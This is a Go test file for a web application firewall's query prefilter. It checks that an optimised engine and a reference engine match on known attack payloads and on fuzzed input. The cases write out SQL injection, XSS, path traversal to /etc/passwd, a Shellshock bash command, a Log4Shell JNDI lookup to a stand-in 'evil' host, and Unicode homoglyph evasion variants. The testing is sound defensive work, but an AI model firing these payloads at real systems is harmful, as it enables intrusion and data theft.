package waf

import (
	"math"
	"reflect"
	"sort"
	"strings"
	"testing"
	"time"
)

// REQ SVALINN-WAF-QUERYPREFILTER-001
//
// The Aho-Corasick query-literal prefilter skips evaluating a signature's
// "query" target only when NONE of that signature's own requiredLiterals
// were found present anywhere in query (raw or decoded). This MUST NOT
// change Scan's output for any input, ever -- a wrong skip is a silent
// false negative in a WAF. Mirrors acprefilter_parity_test.go's body-target
// coverage exactly, forcing queryACReady off instead of bodyACReady.

func newQueryACReferenceEngine(t testing.TB) *Engine {
	t.Helper()
	e := newDefaultEngine(t)
	e.lock.Lock()
	e.queryACReady = false
	e.lock.Unlock()
	return e
}

func assertQueryACScanParity(t *testing.T, optimized, reference *Engine, query string) {
	t.Helper()
	// Generous deadline, not the public Scan() (REQ SVALINN-SCANBUDGET-001's
	// default) -- see assertACScanParity's identical rationale: AC-prefilter
	// correctness and scan-budget cost-bounding are independent properties.
	generousDeadline := time.Now().Add(time.Minute)
	headers := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
	got := optimized.scanWithDeadline("/search", query, "", headers, "Mozilla/5.0", generousDeadline)
	want := reference.scanWithDeadline("/search", query, "", headers, "Mozilla/5.0", generousDeadline)

	gotIDs, wantIDs := acScanSummary(got), acScanSummary(want)
	sort.Strings(gotIDs)
	sort.Strings(wantIDs)
	if !reflect.DeepEqual(gotIDs, wantIDs) {
		t.Fatalf("query AC prefilter changed which signatures matched for query=%q\n  optimized: %v\n  reference: %v", query, gotIDs, wantIDs)
	}
	if got.Blocked != want.Blocked {
		t.Fatalf("query AC prefilter changed Blocked for query=%q: optimized=%v reference=%v", query, got.Blocked, want.Blocked)
	}
	if math.Abs(got.Score-want.Score) > scoreParityEpsilon {
		t.Fatalf("query AC prefilter changed Score for query=%q: optimized=%v reference=%v", query, got.Score, want.Score)
	}
}

func TestQueryACPrefilter_ParityWithKnownAttackPayloads(t *testing.T) {
	optimized := newDefaultEngine(t)
	reference := newQueryACReferenceEngine(t)

	cases := []string{
		"",
		"q=hello+world",
		"id=1'+OR+1=1--+",
		"id=1'+UNION+SELECT+username,password+FROM+users--",
		"q=<script>alert(1)</script>",
		"path=../../../../etc/passwd",
		"cmd=() { :;}; /bin/bash -c 'id'",
		"x=${jndi:ldap://evil/a}",
		"q=" + strings.Repeat("x", 64*1024),
		"q=UNION+SELECT+username,+password+FROM+users",
		// Overlapping/prefix-related literal case -- same class this
		// approach's body counterpart validated against.
		"q=xxxselectxselectxxx",
		// Unicode homoglyph fold cases -- same reasoning as the body
		// prefilter: Go's (?i) is full Unicode case folding, the AC
		// automaton is ASCII-only, folding closes the gap.
		"q=<ſcript>alert(1)</ſcript>",
		"q=' UNION ſELECT username,pasſword FROM users--",
		// Real-string-only-visible-post-decode case -- proves the decoded-
		// query union into queryLiteralsFound isn't silently prefiltered
		// away just because the RAW query lacks the literal.
		"q=%3Cscript%3Ealert(1)%3C/script%3E",
	}

	for _, query := range cases {
		assertQueryACScanParity(t, optimized, reference, query)
	}
}

// FuzzQueryACPrefilter_Parity is the primary safety net: any random query
// string that would ever make the optimized engine and the reference engine
// disagree is a bug in the query prefilter, full stop.
func FuzzQueryACPrefilter_Parity(f *testing.F) {
	optimized := newDefaultEngine(f)
	reference := newQueryACReferenceEngine(f)

	seeds := []string{
		"",
		"q=hello+world",
		"id=1'+OR+1=1--+",
		"q=<script>alert(1)</script>",
		"path=../../../../etc/passwd",
		"x=${jndi:ldap://evil/a}",
		"cmd=() { :;}; /bin/bash -c 'id'",
		"q=\x00\x01\x02\xff\xfe",
		"q=UNION+SELECT+SLEEP(5)",
		"q=xxxselectxselectxxx",
		"q=<ſcript>alert(1)</ſcript>",
		"q=%3Cscript%3E",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, query string) {
		assertQueryACScanParity(t, optimized, reference, query)
	})
}
